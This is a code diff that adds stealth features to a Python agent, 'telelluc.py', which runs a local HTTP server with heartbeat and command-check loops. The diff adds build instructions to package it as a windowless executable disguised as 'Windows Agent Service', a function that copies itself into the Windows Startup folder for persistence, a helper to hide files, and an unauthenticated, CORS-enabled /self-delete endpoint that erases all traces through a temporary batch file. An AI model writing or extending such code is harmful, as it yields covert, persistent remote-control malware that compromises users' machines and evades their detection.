@@ -1,14 +1,19 @@
 import ctypes
 import json
 import os
+import shutil
 import socket
 import subprocess
+import sys
 import tempfile
 import threading
 import time
 import urllib.error
 import urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
+
+#cd /d C:\Users\User\Desktop\telelluc
+#python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
 
 PORT = 5005
 
@@ -42,6 +47,105 @@ HWND_TOPMOST = -1
 SWP_NOMOVE = 0x0002
 SWP_NOSIZE = 0x0001
 SWP_SHOWWINDOW = 0x0040
+
+
+def _hide_path(path):
+    try:
+        subprocess.run(["attrib", "+h", path], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except OSError:
+        pass
+
+
+def ensure_startup():
+    startup_dir = os.path.join(
+        os.environ.get("APPDATA", ""),
+        "Microsoft",
+        "Windows",
+        "Start Menu",
+        "Programs",
+        "Startup",
+    )
+    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
+
+    try:
+        os.makedirs(startup_dir, exist_ok=True)
+    except OSError:
+        return
+
+    if getattr(sys, "frozen", False):
+        source_exe = os.path.abspath(sys.executable)
+        try:
+            if not os.path.exists(startup_exe):
+                shutil.copy2(source_exe, startup_exe)
+            elif os.path.getmtime(source_exe) > os.path.getmtime(startup_exe):
+                shutil.copy2(source_exe, startup_exe)
+        except OSError:
+            pass
+
+
+def self_delete_agent(trigger_id):
+    startup_dir = os.path.join(
+        os.environ.get("APPDATA", ""),
+        "Microsoft",
+        "Windows",
+        "Start Menu",
+        "Programs",
+        "Startup",
+    )
+    candidates = []
+    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
+    startup_vbs = os.path.join(startup_dir, "Windows Agent Service.vbs")
+    startup_lnk = os.path.join(startup_dir, "Windows Agent Service.lnk")
+    if startup_exe:
+        candidates.append(startup_exe)
+    if startup_vbs:
+        candidates.append(startup_vbs)
+    if startup_lnk:
+        candidates.append(startup_lnk)
+
+    if getattr(sys, "frozen", False):
+        candidates.append(os.path.abspath(sys.executable))
+    else:
+        candidates.append(os.path.abspath(__file__))
+
+    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
+    local_exe = os.path.join(local_dir, "Windows Agent Service.exe")
+    if local_exe:
+        candidates.append(local_exe)
+
+    seen = set()
+    unique_paths = []
+    for path in candidates:
+        if not path:
+            continue
+        normalized = os.path.normcase(os.path.abspath(path))
+        if normalized in seen:
+            continue
+        seen.add(normalized)
+        unique_paths.append(normalized)
+
+    batch_lines = [
+        "@echo off",
+        "setlocal",
+        "timeout /t 2 /nobreak >nul",
+    ]
+    for path in unique_paths:
+        batch_lines.append(f'del /f /q "{path}" 2>nul')
+    batch_lines.append("exit /b 0")
+
+    tmp_dir = tempfile.gettempdir()
+    batch_path = os.path.join(tmp_dir, f"telelluc_self_delete_{int(time.time())}.bat")
+    try:
+        with open(batch_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(batch_lines) + "\n")
+        subprocess.Popen(["cmd", "/c", batch_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+    except Exception:
+        pass
+
+    try:
+        os._exit(0)
+    except Exception:
+        raise SystemExit(0)
 
 
 def _find_error_window():
@@ -156,11 +260,32 @@ class Handler(BaseHTTPRequestHandler):
         self._cors()
         self.end_headers()
 
+    def do_POST(self):
+        if self.path == "/self-delete":
+            length = int(self.headers.get("Content-Length", "0"))
+            body = self.rfile.read(length).decode("utf-8") if length else "{}"
+            try:
+                payload = json.loads(body)
+            except Exception:
+                payload = {}
+            trigger_id = payload.get("id") if isinstance(payload, dict) else None
+            threading.Thread(target=lambda: self_delete_agent(trigger_id), daemon=True).start()
+            self.send_response(200)
+            self._cors()
+            self.end_headers()
+            self.wfile.write(b'{"ok": true}')
+            return
+
+        self.send_response(404)
+        self._cors()
+        self.end_headers()
+
     def log_message(self, format, *args):
         pass
 
 
 if __name__ == "__main__":
+    ensure_startup()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_check_loop, daemon=True).start()
 
